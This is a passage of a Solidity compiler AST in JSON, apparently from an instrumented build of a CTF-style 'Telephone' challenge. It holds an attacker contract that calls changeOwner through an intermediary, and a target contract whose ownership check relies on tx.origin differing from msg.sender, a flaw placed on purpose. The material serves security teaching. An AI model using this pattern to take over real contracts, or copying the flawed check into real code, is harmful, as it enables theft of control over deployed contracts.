                              {
                                "typeIdentifier": "t_rational_11317814353076187452961395993658241566574074362769755405406491327971044814771_by_1",
                                "typeString": "int_const 1131...(69 digits omitted)...4771"
                              }
                            ],
                            "id": 207,
                            "name": "c_0x57d152bd",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 191,
                            "src": "935:12:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 209,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "935:80:2",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 210,
                        "nodeType": "ExpressionStatement",
                        "src": "935:80:2"
                      },
                      {
                        "expression": {
                          "id": 215,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 211,
                            "name": "telephone",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 194,
                            "src": "1034:9:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Telephone_$328",
                              "typeString": "contract Telephone"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "arguments": [
                              {
                                "id": 213,
                                "name": "_address",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 196,
                                "src": "1056:8:2",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_address",
                                  "typeString": "address"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_address",
                                  "typeString": "address"
                                }
                              ],
                              "id": 212,
                              "name": "Telephone",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 328,
                              "src": "1046:9:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_contract$_Telephone_$328_$",
                                "typeString": "type(contract Telephone)"
                              }
                            },
                            "id": 214,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "1046:19:2",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Telephone_$328",
                              "typeString": "contract Telephone"
                            }
                          },
                          "src": "1034:31:2",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_Telephone_$328",
                            "typeString": "contract Telephone"
                          }
                        },
                        "id": 216,
                        "nodeType": "ExpressionStatement",
                        "src": "1034:31:2"
                      }
                    ]
                  },
                  "id": 218,
                  "implemented": true,
                  "kind": "constructor",
                  "modifiers": [],
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 197,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 196,
                        "mutability": "mutable",
                        "name": "_address",
                        "nameLocation": "722:8:2",
                        "nodeType": "VariableDeclaration",
                        "scope": 218,
                        "src": "714:16:2",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "typeName": {
                          "id": 195,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "714:7:2",
                          "stateMutability": "nonpayable",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "713:18:2"
                  },
                  "returnParameters": {
                    "id": 198,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "732:0:2"
                  },
                  "scope": 244,
                  "src": "702:371:2",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "public"
                },
                {
                  "body": {
                    "id": 242,
                    "nodeType": "Block",
                    "src": "1174:339:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307839356464623137356131666463333763343339396634643865333666663537383361663862616530633034316663343964313730376436666162363065643138",
                              "id": 225,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1188:66:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_67786312420699528045703540892052535221116364592878975183492548447532285488408_by_1",
                                "typeString": "int_const 6778...(69 digits omitted)...8408"
                              },
                              "value": "0x95ddb175a1fdc37c4399f4d8e36ff5783af8bae0c041fc49d1707d6fab60ed18"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_67786312420699528045703540892052535221116364592878975183492548447532285488408_by_1",
                                "typeString": "int_const 6778...(69 digits omitted)...8408"
                              }
                            ],
                            "id": 224,
                            "name": "c_0x57d152bd",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 191,
                            "src": "1175:12:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 226,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1175:80:2",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 227,
                        "nodeType": "ExpressionStatement",
                        "src": "1175:80:2"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307861346431346662303532623939653930626539393362336539363932626531663065653635336539333863303863636461346631636634386264613732396133",
                              "id": 229,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1288:66:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_74549128195818347198544783659613532394309821079033225799226534259009125820835_by_1",
                                "typeString": "int_const 7454...(69 digits omitted)...0835"
                              },
                              "value": "0xa4d14fb052b99e90be993b3e9692be1f0ee653e938c08ccda4f1cf48bda729a3"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_74549128195818347198544783659613532394309821079033225799226534259009125820835_by_1",
                                "typeString": "int_const 7454...(69 digits omitted)...0835"
                              }
                            ],
                            "id": 228,
                            "name": "c_0x57d152bd",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 191,
                            "src": "1275:12:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 230,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1275:80:2",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 231,
                        "nodeType": "ExpressionStatement",
                        "src": "1275:80:2"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307833333663376538343836376334383431653131333762656330383036303764363537616164373865306631323365326438653764366330313437396431323935",
                              "id": 233,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1390:66:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_23259647953658280827489467977622053391053599416837437460171550680297332609685_by_1",
                                "typeString": "int_const 2325...(69 digits omitted)...9685"
                              },
                              "value": "0x336c7e84867c4841e1137bec080607d657aad78e0f123e2d8e7d6c01479d1295"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_23259647953658280827489467977622053391053599416837437460171550680297332609685_by_1",
                                "typeString": "int_const 2325...(69 digits omitted)...9685"
                              }
                            ],
                            "id": 232,
                            "name": "c_0x57d152bd",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 191,
                            "src": "1377:12:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 234,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1377:80:2",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 235,
                        "nodeType": "ExpressionStatement",
                        "src": "1377:80:2"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 239,
                              "name": "_owner",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 221,
                              "src": "1498:6:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "expression": {
                              "id": 236,
                              "name": "telephone",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 194,
                              "src": "1476:9:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Telephone_$328",
                                "typeString": "contract Telephone"
                              }
                            },
                            "id": 238,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "changeOwner",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 327,
                            "src": "1476:21:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
                              "typeString": "function (address) external"
                            }
                          },
                          "id": 240,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1476:29:2",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 241,
                        "nodeType": "ExpressionStatement",
                        "src": "1476:29:2"
                      }
                    ]
                  },
                  "documentation": {
                    "id": 219,
                    "nodeType": "StructuredDocumentation",
                    "src": "1081:43:2",
                    "text": "@dev Change the owner of the telephone."
                  },
                  "functionSelector": "a6f9dae1",
                  "id": 243,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "changeOwner",
                  "nameLocation": "1139:11:2",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 222,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 221,
                        "mutability": "mutable",
                        "name": "_owner",
                        "nameLocation": "1159:6:2",
                        "nodeType": "VariableDeclaration",
                        "scope": 243,
                        "src": "1151:14:2",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "typeName": {
                          "id": 220,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "1151:7:2",
                          "stateMutability": "nonpayable",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "1150:16:2"
                  },
                  "returnParameters": {
                    "id": 223,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "1174:0:2"
                  },
                  "scope": 244,
                  "src": "1130:383:2",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "public"
                }
              ],
              "scope": 245,
              "src": "581:935:2",
              "usedErrors": []
            }
          ],
          "src": "33:1485:2"
        },
        "id": 2
      },
      "contracts/4_Telephone/Telephone.sol": {
        "ast": {
          "absolutePath": "contracts/4_Telephone/Telephone.sol",
          "exportedSymbols": {
            "Telephone": [
              328
            ],
            "c_0x8154b289": [
              252
            ]
          },
          "id": 329,
          "license": "MIT",
          "nodeType": "SourceUnit",
          "nodes": [
            {
              "id": 246,
              "literals": [
                "solidity",
                "0.8",
                ".10"
              ],
              "nodeType": "PragmaDirective",
              "src": "33:23:3"
            },
            {
              "body": {
                "id": 251,
                "nodeType": "Block",
                "src": "107:2:3",
                "statements": []
              },
              "id": 252,
              "implemented": true,
              "kind": "freeFunction",
              "modifiers": [],
              "name": "c_0x8154b289",
              "nameLocation": "66:12:3",
              "nodeType": "FunctionDefinition",
              "parameters": {
                "id": 249,
                "nodeType": "ParameterList",
                "parameters": [
                  {
                    "constant": false,
                    "id": 248,
                    "mutability": "mutable",
                    "name": "c__0x8154b289",
                    "nameLocation": "87:13:3",
                    "nodeType": "VariableDeclaration",
                    "scope": 252,
                    "src": "79:21:3",
                    "stateVariable": false,
                    "storageLocation": "default",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes32",
                      "typeString": "bytes32"
                    },
                    "typeName": {
                      "id": 247,
                      "name": "bytes32",
                      "nodeType": "ElementaryTypeName",
                      "src": "79:7:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes32",
                        "typeString": "bytes32"
                      }
                    },
                    "visibility": "internal"
                  }
                ],
                "src": "78:23:3"
              },
              "returnParameters": {
                "id": 250,
                "nodeType": "ParameterList",
                "parameters": [],
                "src": "107:0:3"
              },
              "scope": 329,
              "src": "57:52:3",
              "stateMutability": "pure",
              "virtual": false,
              "visibility": "internal"
            },
            {
              "abstract": false,
              "baseContracts": [],
              "canonicalName": "Telephone",
              "contractDependencies": [],
              "contractKind": "contract",
              "fullyImplemented": true,
              "id": 328,
              "linearizedBaseContracts": [
                328
              ],
              "name": "Telephone",
              "nameLocation": "123:9:3",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "body": {
                    "id": 257,
                    "nodeType": "Block",
                    "src": "194:2:3",
                    "statements": []
                  },
                  "id": 258,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "c_0xac82e904",
                  "nameLocation": "144:12:3",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 255,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 254,
                        "mutability": "mutable",
                        "name": "c__0xac82e904",
                        "nameLocation": "165:13:3",
                        "nodeType": "VariableDeclaration",
                        "scope": 258,
                        "src": "157:21:3",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes32",
                          "typeString": "bytes32"
                        },
                        "typeName": {
                          "id": 253,
                          "name": "bytes32",
                          "nodeType": "ElementaryTypeName",
                          "src": "157:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bytes32",
                            "typeString": "bytes32"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "156:23:3"
                  },
                  "returnParameters": {
                    "id": 256,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "194:0:3"
                  },
                  "scope": 328,
                  "src": "135:61:3",
                  "stateMutability": "pure",
                  "virtual": false,
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "functionSelector": "8da5cb5b",
                  "id": 260,
                  "mutability": "mutable",
                  "name": "owner",
                  "nameLocation": "218:5:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 328,
                  "src": "203:20:3",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 259,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "203:7:3",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "public"
                },
                {
                  "body": {
                    "id": 280,
                    "nodeType": "Block",
                    "src": "246:328:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307863666136633336353763396235316332623932646635316230313739303935636337366639636336326632323230636232363731343665663063313039613837",
                              "id": 264,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "260:66:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_93923404846104210586919295760680819976816915331138522671162847231564548446855_by_1",
                                "typeString": "int_const 9392...(69 digits omitted)...6855"
                              },
                              "value": "0xcfa6c3657c9b51c2b92df51b0179095cc76f9cc62f2220cb267146ef0c109a87"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_93923404846104210586919295760680819976816915331138522671162847231564548446855_by_1",
                                "typeString": "int_const 9392...(69 digits omitted)...6855"
                              }
                            ],
                            "id": 263,
                            "name": "c_0xac82e904",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 258,
                            "src": "247:12:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 265,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "247:80:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 266,
                        "nodeType": "ExpressionStatement",
                        "src": "247:80:3"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307831316438643038336463646663376264383963633666363031623237636334366131653830653130666165396139656266666663356530623064316535363064",
                              "id": 268,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "360:66:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_8072396510161567468113187565745366952907180958552529300462175605478693688845_by_1",
                                "typeString": "int_const 8072...(68 digits omitted)...8845"
                              },
                              "value": "0x11d8d083dcdfc7bd89cc6f601b27cc46a1e80e10fae9a9ebfffc5e0b0d1e560d"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_8072396510161567468113187565745366952907180958552529300462175605478693688845_by_1",
                                "typeString": "int_const 8072...(68 digits omitted)...8845"
                              }
                            ],
                            "id": 267,
                            "name": "c_0xac82e904",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 258,
                            "src": "347:12:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 269,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "347:80:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 270,
                        "nodeType": "ExpressionStatement",
                        "src": "347:80:3"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307838333833646363646361626436343037316164373162333038383761376132386266633730616536373137636161373162363434373836666161303732636336",
                              "id": 272,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "462:66:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_59485964062230219659779508482406359933031680561567472494579753753615870143686_by_1",
                                "typeString": "int_const 5948...(69 digits omitted)...3686"
                              },
                              "value": "0x8383dccdcabd64071ad71b30887a7a28bfc70ae6717caa71b644786faa072cc6"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_59485964062230219659779508482406359933031680561567472494579753753615870143686_by_1",
                                "typeString": "int_const 5948...(69 digits omitted)...3686"
                              }
                            ],
                            "id": 271,
                            "name": "c_0xac82e904",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 258,
                            "src": "449:12:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 273,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "449:80:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 274,
                        "nodeType": "ExpressionStatement",
                        "src": "449:80:3"
                      },
                      {
                        "expression": {
                          "id": 278,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 275,
                            "name": "owner",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 260,
                            "src": "548:5:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "expression": {
                              "id": 276,
                              "name": "msg",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -15,
                              "src": "556:3:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_message",
                                "typeString": "msg"
                              }
                            },
                            "id": 277,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "sender",
                            "nodeType": "MemberAccess",
                            "src": "556:10:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "src": "548:18:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 279,
                        "nodeType": "ExpressionStatement",
                        "src": "548:18:3"
                      }
                    ]
                  },
                  "id": 281,
                  "implemented": true,
                  "kind": "constructor",
                  "modifiers": [],
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 261,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "243:2:3"
                  },
                  "returnParameters": {
                    "id": 262,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "246:0:3"
                  },
                  "scope": 328,
                  "src": "232:342:3",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "public"
                },
                {
                  "body": {
                    "id": 326,
                    "nodeType": "Block",
                    "src": "626:772:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307833383132393238356566366239353162653236373138376461306133393736663332333666656635643663343130373833666663326265636534363438613837",
                              "id": 287,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "640:66:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_25362334033682361384681940297040471248835656144024578113434694344017822648967_by_1",
                                "typeString": "int_const 2536...(69 digits omitted)...8967"
                              },
                              "value": "0x38129285ef6b951be267187da0a3976f3236fef5d6c410783ffc2bece4648a87"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_25362334033682361384681940297040471248835656144024578113434694344017822648967_by_1",
                                "typeString": "int_const 2536...(69 digits omitted)...8967"
                              }
                            ],
                            "id": 286,
                            "name": "c_0xac82e904",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 258,
                            "src": "627:12:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 288,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "627:80:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 289,
                        "nodeType": "ExpressionStatement",
                        "src": "627:80:3"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307866613364623331323630356166636635323032303036633431663636633737373031356637323362326630383563663639306430646531663238303664376464",
                              "id": 291,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "740:66:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_113187225724790604396851089054137736870855528086064663590572078906755179272157_by_1",
                                "typeString": "int_const 1131...(70 digits omitted)...2157"
                              },
                              "value": "0xfa3db312605afcf5202006c41f66c777015f723b2f085cf690d0de1f2806d7dd"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_113187225724790604396851089054137736870855528086064663590572078906755179272157_by_1",
                                "typeString": "int_const 1131...(70 digits omitted)...2157"
                              }
                            ],
                            "id": 290,
                            "name": "c_0xac82e904",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 258,
                            "src": "727:12:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 292,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "727:80:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 293,
                        "nodeType": "ExpressionStatement",
                        "src": "727:80:3"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307862316535653063326261303964363434336563333066306536653465306361306464386563616265376531356161336631326461313933616166643336343536",
                              "id": 295,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "842:66:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_80465533418075868215794374400868493399609827910930438447393960986963344581718_by_1",
                                "typeString": "int_const 8046...(69 digits omitted)...1718"
                              },
                              "value": "0xb1e5e0c2ba09d6443ec30f0e6e4e0ca0dd8ecabe7e15aa3f12da193aafd36456"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_80465533418075868215794374400868493399609827910930438447393960986963344581718_by_1",
                                "typeString": "int_const 8046...(69 digits omitted)...1718"
                              }
                            ],
                            "id": 294,
                            "name": "c_0xac82e904",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 258,
                            "src": "829:12:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 296,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "829:80:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 297,
                        "nodeType": "ExpressionStatement",
                        "src": "829:80:3"
                      },
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          },
                          "id": 302,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "expression": {
                              "id": 298,
                              "name": "tx",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -26,
                              "src": "932:2:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_transaction",
                                "typeString": "tx"
                              }
                            },
                            "id": 299,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "origin",
                            "nodeType": "MemberAccess",
                            "src": "932:9:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "!=",
                          "rightExpression": {
                            "expression": {
                              "id": 300,
                              "name": "msg",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -15,
                              "src": "945:3:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_message",
                                "typeString": "msg"
                              }
                            },
                            "id": 301,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "sender",
                            "nodeType": "MemberAccess",
                            "src": "945:10:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "src": "932:23:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "falseBody": {
                          "id": 324,
                          "nodeType": "Block",
                          "src": "1292:99:3",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "hexValue": "307839616634666566633332346631666462313636373438363434653634306139653034663130363439393964653763656133303366623031323536316464323436",
                                    "id": 321,
